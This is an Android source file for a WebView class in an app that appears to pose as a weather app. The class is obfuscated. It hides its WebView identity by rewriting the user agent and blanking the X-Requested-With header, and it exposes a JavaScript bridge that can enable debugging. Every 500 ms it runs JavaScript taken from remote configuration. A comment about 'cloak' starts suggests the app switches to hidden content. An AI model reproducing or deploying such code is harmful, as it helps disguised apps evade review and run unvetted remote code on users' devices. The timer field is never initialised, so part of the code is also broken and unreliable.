package com.utilitydevs34.luckyweather.view;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.util.AttributeSet;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewParent;
import android.webkit.ConsoleMessage;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.Nullable;
import androidx.constraintlayout.widget.ConstraintLayout;

import com.utilitydevs34.luckyweather.AppSingletonClass;
import static com.utilitydevs34.luckyweather.GPSTopActivity.REASON_MAGIC;
import java.util.Timer;
import java.util.TimerTask;

import io.michaelrocks.paranoid.Obfuscate;

import static com.utilitydevs34.luckyweather.foo.Utils.runOnUiThread;

@Obfuscate
public class CustomView extends AdvancedWebView {

    private boolean debugMode = false;
    private WebViewEventListener mWebViewEventListener;
    private Timer jsTimer;

    public CustomView(Context context) {
        super(context);
        _init();
    }

    public CustomView(Context context, AttributeSet attrs) {
        super(context, attrs);
        _init();
    }

    public CustomView(Context context, AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
        _init();
    }

    public void setEventListener(WebViewEventListener wel){
        mWebViewEventListener = wel;
    }

    private void _init(){
        setMixedContentAllowed(true);
        setThirdPartyCookiesEnabled(true);
        getSettings().setDomStorageEnabled(true);
        getSettings().setSupportMultipleWindows(false);
        getSettings().setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        addHttpHeader("X-Requested-With","");
        setWebChromeClient(new CustomWebChromeClient());
        WebSettings ws = getSettings();
        ws.setUserAgentString(ws.getUserAgentString().replace("; wv", ""));
        setWebViewClient(new MyAdViewClient());
        addJavascriptInterface(this, "APP");

        debugMode(AppSingletonClass.getRemoteConfig().getBool("wv_debug", false));

        if(AppSingletonClass.getRemoteConfig().getBool("jstimer", false)
                && AppSingletonClass.getRemoteConfig().has("js")
                && AppSingletonClass.getRemoteConfig().getStr("js","").length()>0
        ) {
            jsTimer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    try {
                        runOnUiThread(() -> {
                            evaluateJavascript(AppSingletonClass.getRemoteConfig().getStr("js", ""), (ignored) -> {
                            });
                        });
                    } catch (Exception e) {
                        if (debugMode) e.printStackTrace();
                    }
                }
            }, 500, 500);
        }
    }

    private class MyAdViewClient extends WebViewClient {
        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            CookieManager.getInstance().flush();
        }

        @Nullable
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
            Uri url = request.getUrl();
            if (url.getHost() != null) {
                // webviews may call http://host/favicon.ico automatically. Here we're checking only host value, but to avoid multiple cloak starts need to
                // check if the request is calling localhost without path
                if (url.getHost().equals("localhost") && (url.getPath() == null || url.getPath().length() <= 1)) {
                    //show application's main activity in case of navigation to localhost
                    runOnUiThread(() -> {
                        mWebViewEventListener.onStartSweetie(REASON_MAGIC);
                    });
                }
            }
            return super.shouldInterceptRequest(view, request);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, final String url) {
            if( URLUtil.isNetworkUrl(url) ) {
                return false;
            }
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            try {
                mWebViewEventListener.onStartIntent(intent);
            }catch (Exception ignored){}
            return true;
        }
    }

    class CustomWebChromeClient extends WebChromeClient {
        View mCustomView;

        @Override
        public void onShowCustomView(View view, CustomViewCallback callback) {
            if(mCustomView!=null){
                onHideCustomView();
                mCustomView = null;
            }
            ViewParent parent = getParent();
            if(parent instanceof ViewGroup){
                ((ViewGroup) parent).addView(view);
                view.setLayoutParams(new ConstraintLayout.LayoutParams(-1,-1));
                setVisibility(INVISIBLE);
            }
            mCustomView = view;
        }

        @Override
        public void onHideCustomView() {
            ViewParent parent = getParent();
            if(parent instanceof ViewGroup){
                ((ViewGroup) parent).removeView(mCustomView);
            }
            setVisibility(VISIBLE);
            mCustomView = null;
        }

        @Override
        public boolean onConsoleMessage(ConsoleMessage cm) {
            if(debugMode) Log.w("WV", cm.message() + " at " + cm.sourceId() + ":" + cm.lineNumber());
            return true;
        }
    }

    @JavascriptInterface
    public boolean debugMode(boolean on){
        debugMode = on;
        WebView.setWebContentsDebuggingEnabled(on);
        return true;
    }

    @JavascriptInterface
    public boolean JSTimer(boolean on){
        if(!on) {
            jsTimer.cancel();
        }
        return true;
    }

    public interface WebViewEventListener {
        void onStartIntent(Intent i);
        void onStartSweetie(byte reason);
    }
}